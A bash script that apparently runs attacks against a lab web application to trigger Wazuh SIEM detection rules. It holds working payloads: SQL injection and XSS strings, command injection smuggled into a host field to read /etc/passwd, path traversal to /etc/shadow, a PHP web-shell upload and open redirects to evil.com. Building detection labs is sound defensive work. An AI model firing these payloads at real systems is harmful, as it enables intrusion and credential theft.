#!/usr/bin/env bash
# EduVibe — full attack simulation (OWASP-style lab scenarios)
# Triggers Flask SIEM events aligned with local Wazuh rules (100201–100217, 100300, etc.)
#
# Usage:
#   chmod +x attack_simulation.sh
#   ./attack_simulation.sh                    # default TARGET below
#   TARGET=http://127.0.0.1:5000 DELAY=2 ./attack_simulation.sh  # local Flask
#
# Requires: bash, curl; seeded DB from database/init_db.py (alice, admin, bob, course id 1).
# Documentation: ATTACK_SCENARIOS.md (Part I = this script; Part II = other implemented A1–A10).
# Code tags: routes/*.py use (A1)–(A10); [sim] = exercised here.
# Note: A1+ intentionally locks bob@instructor.local — unlock via admin panel before using Bob again.

set -u

TARGET="${TARGET:-http://172.20.10.2}"
DELAY="${DELAY:-3}"
COOKIE_DIR="${TMPDIR:-/tmp}"
ALICE_COOKIE="$COOKIE_DIR/eduvibe_alice_cookies.txt"
ADMIN_COOKIE="$COOKIE_DIR/eduvibe_admin_cookies.txt"

echo "========================================"
echo "  EduVibe Attack Simulation"
echo "  Target: $TARGET"
echo "  Started: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "========================================"
echo ""

cleanup() {
  rm -f "$ALICE_COOKIE" "$ADMIN_COOKIE" /tmp/eduvibe_shell.php /tmp/eduvibe_malicious.sh
}
trap cleanup EXIT

# ─────────────────────────────────────────
# SETUP — sessions + baseline telemetry
# ─────────────────────────────────────────
echo "[SETUP] Health check (health_check / rule 100210)..."
curl -sS -o /dev/null "$TARGET/health" || true

echo "[SETUP] Logging in as alice (student)..."
curl -sS -c "$ALICE_COOKIE" -X POST "$TARGET/login" \
  -d "email=alice@student.local&password=alice123" -o /dev/null || true

echo "[SETUP] Logging in as admin..."
curl -sS -c "$ADMIN_COOKIE" -X POST "$TARGET/login" \
  -d "email=admin@eduvibe.local&password=admin123" -o /dev/null || true

echo "[SETUP] Done."
echo ""
sleep "$DELAY"

# ─────────────────────────────────────────
# A1 — Brute-force authentication
# Rules: 100201 (login_attempt), 100217 (login_failed), 100300 (correlation)
# Non-existent email avoids locking seeded accounts.
# ─────────────────────────────────────────
echo "[A1] Brute-force authentication..."
for i in {1..6}; do
  curl -sS -o /dev/null -X POST "$TARGET/login" \
    -d "email=attacker@test.com&password=wrongpass$i" || true
  sleep 0.3
done
echo "[A1] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A1+ — Account lockout + account_state_enforced (Bob)
# Rule: 100216 (account_state_enforced), plus login_attempt / login_failed
# WARNING: Bob stays locked until an admin clears lock — intentional for SIEM demo.
# ─────────────────────────────────────────
echo "[A1+] Account state enforced (locks bob@instructor.local)..."
for i in {1..5}; do
  curl -sS -o /dev/null -X POST "$TARGET/login" \
    -d "email=bob@instructor.local&password=wrong$i" || true
  sleep 0.2
done
curl -sS -o /dev/null -X POST "$TARGET/login" \
  -d "email=bob@instructor.local&password=bob123" || true
echo "[A1+] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A2 — SQL injection pattern logging
# Rules: 100202 (sqli_pattern_detected)
# Tokens matched in app: ' or ", union, --, /*, 1=1
# ─────────────────────────────────────────
echo "[A2] SQL injection patterns..."
curl -sS -o /dev/null -X POST "$TARGET/login" \
  --data "email=' or '1'='1&password=anything" || true
curl -sS -o /dev/null "$TARGET/courses?search=%27%20OR%201%3D1--" || true
curl -sS -o /dev/null "$TARGET/courses?search=1 union select 1,2,3--" || true
echo "[A2] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A3 — Cross-site scripting (stored vectors)
# Rule: 100203 (xss_payload_detected)
# ─────────────────────────────────────────
echo "[A3] Cross-site scripting (XSS)..."
curl -sS -b "$ALICE_COOKIE" -o /dev/null -X POST "$TARGET/profile" \
  -d "bio=<script>alert('xss')</script>&username=alice" || true
curl -sS -b "$ALICE_COOKIE" -o /dev/null -X POST "$TARGET/courses/1/review" \
  -d "content=<script>alert('xss')</script>&rating=5" || true
curl -sS -b "$ALICE_COOKIE" -o /dev/null -X POST "$TARGET/profile" \
  -d "bio=<img src=x onerror=alert(1)>&username=alice" || true
echo "[A3] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A4 — Command injection
# Rule: 100204 (command_exec)
# ─────────────────────────────────────────
echo "[A4] Command injection..."
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X POST "$TARGET/admin/run" \
  -d "host=127.0.0.1;whoami" || true
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X POST "$TARGET/admin/run" \
  -d "host=127.0.0.1;cat /etc/passwd" || true
echo "[A4] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A5 — Path traversal + file access error
# Rules: 100205 (path_traversal_attempt), 100215 (file_access_error)
# /etc/passwd may open successfully (no error event). Missing path increases chance of 100215.
# ─────────────────────────────────────────
echo "[A5] Path traversal..."
curl -sS -o /dev/null "$TARGET/files/view?path=../../etc/passwd" || true
curl -sS -o /dev/null "$TARGET/files/view?path=../../../etc/shadow" || true
curl -sS -o /dev/null "$TARGET/files/view?path=../../../../eduvibe_nonexistent_traversal_404.bin" || true
echo "[A5] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A6 — File upload abuse
# Rule: 100206 (file_upload_attempt)
# ─────────────────────────────────────────
echo "[A6] File upload abuse..."
echo '<?php system($_GET["cmd"]); ?>' > /tmp/eduvibe_shell.php
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X POST "$TARGET/admin/upload" \
  -F "file=@/tmp/eduvibe_shell.php" || true
echo "#!/bin/bash" > /tmp/eduvibe_malicious.sh
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X POST "$TARGET/admin/upload" \
  -F "file=@/tmp/eduvibe_malicious.sh" || true
echo "[A6] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A7 — Authorization bypass / IDOR
# Rules: 100213 (authorization_bypass), 100214 (unauthorized_access_attempt)
# ─────────────────────────────────────────
echo "[A7] Authorization bypass..."
curl -sS -o /dev/null "$TARGET/admin" || true
curl -sS -o /dev/null "$TARGET/dashboard" || true
curl -sS -b "$ALICE_COOKIE" -o /dev/null "$TARGET/admin" || true
curl -sS -b "$ALICE_COOKIE" -o /dev/null "$TARGET/dashboard?user_id=3" || true
curl -sS -b "$ALICE_COOKIE" -o /dev/null "$TARGET/profile/3" || true
echo "[A7] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A8 — Open redirect
# Rule: 100208 (open_redirect)
# ─────────────────────────────────────────
echo "[A8] Open redirect..."
curl -sS -o /dev/null "$TARGET/redirect?url=http://evil.com" || true
curl -sS -o /dev/null "$TARGET/redirect?url=https://attacker.example.com/phishing" || true
echo "[A8] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A9 — Suspicious User-Agent
# Rule: 100207 (suspicious_user_agent)
# ─────────────────────────────────────────
echo "[A9] Suspicious User-Agent..."
curl -sS -o /dev/null -A "sqlmap/1.8" "$TARGET/" || true
curl -sS -o /dev/null -A "Nikto/2.1.6" "$TARGET/login" || true
curl -sS -o /dev/null -A "Hydra/9.0" "$TARGET/login" || true
curl -sS -o /dev/null -A "nmap scripting engine" "$TARGET/" || true
curl -sS -o /dev/null -A "Burp Suite Professional" "$TARGET/" || true
echo "[A9] Done."
sleep "$DELAY"

# ─────────────────────────────────────────
# A10 — HTTP method abuse
# Rules: 100209 (http_method_abuse)
# /login allows GET, POST, PUT, DELETE, TRACE
# /files/view allows GET, POST, DELETE
# /admin allows TRACE (etc.)
# /admin/run allows POST, GET, TRACE — use TRACE here (DELETE returns 405; no Flask handler log).
# ─────────────────────────────────────────
echo "[A10] HTTP method abuse..."
curl -sS -o /dev/null -X TRACE "$TARGET/login" || true
curl -sS -o /dev/null -X DELETE "$TARGET/login" || true
curl -sS -o /dev/null -X PUT "$TARGET/login" || true
curl -sS -o /dev/null -X DELETE "$TARGET/files/view" || true
curl -sS -o /dev/null -X POST "$TARGET/files/view" || true
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X TRACE "$TARGET/admin" || true
curl -sS -b "$ADMIN_COOKIE" -o /dev/null -X TRACE "$TARGET/admin/run" || true
echo "[A10] Done."

echo ""
echo "========================================"
echo "  Simulation complete"
echo "  Finished: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "  Wazuh (example): sudo tail -f /var/ossec/logs/alerts/alerts.json"
echo "  Bob account is locked until unlocked in admin UI (A1+)."
echo "========================================"
